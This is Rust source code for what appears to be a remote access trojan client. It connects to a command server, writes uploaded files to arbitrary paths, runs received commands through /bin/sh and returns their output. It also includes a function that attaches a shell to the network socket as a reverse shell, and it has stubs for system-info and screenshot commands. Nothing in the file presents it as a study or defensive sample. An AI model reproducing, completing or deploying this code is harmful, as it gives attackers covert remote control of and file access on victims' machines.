use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::os::fd::{RawFd, AsRawFd, FromRawFd};
use std::fs;

#[allow(dead_code)]
enum CommandType {
	Upload = 10,
	Shell,
	Exec,
	SysInfo,
	ScrShot
}

const RECV_BUFF_SIZE: usize = 102400;

fn upload(destination: String, data: &[u8]) {
	let _ = fs::write(destination, data);
}

#[allow(dead_code)]
fn shell(stream: &mut TcpStream) {
	/*
	 * currently works fine with netcat, 
	 * but not with the server yet.
	 */
	let stream_fd: RawFd = stream.as_raw_fd();
	
	unsafe {
		let _ = Command::new("/bin/sh")
			.stdout(Stdio::from_raw_fd(stream_fd))
			.stdin(Stdio::from_raw_fd(stream_fd))
			.stderr(Stdio::from_raw_fd(stream_fd))
			.spawn();
	}
}

fn exec_cmd(command: String) -> String {
	let mut res = String::from_utf8(
						Command::new(format!("/bin/sh"))
							.arg("-c")
							.arg(command)
							.output()
							.unwrap()
							.stdout).unwrap();

	// maybe its a command without an output (e.g. cd)
	if res.is_empty() {
		res = String::from("\n");
	}

	res
}

fn connect() {
	let mut stream = TcpStream::connect("127.0.0.1:8090").unwrap();

	// note: replace with something more efficient (e.g. Vec)
	let mut data: [u8; RECV_BUFF_SIZE] = [0; RECV_BUFF_SIZE];
	loop {
		let mut read_res = stream.read(&mut data).unwrap();
		if read_res > 0 {
			let head = &data[..read_res];
			let cmdt = head[0];
			let arg = String::from_utf8((&head[1..]).to_vec()).unwrap();
			if cmdt == (CommandType::Upload as u8) {
				let _ = stream.write(&[0u8; 8]);
				read_res = stream.read(&mut data).unwrap();
				if read_res > 0 {
					upload(arg, &data[..read_res]);
				}
			} else if cmdt == (CommandType::Exec as u8) {
				let _ = stream.write(exec_cmd(arg).as_bytes());
			}
		}
	}
}

fn main() {
	connect();
}
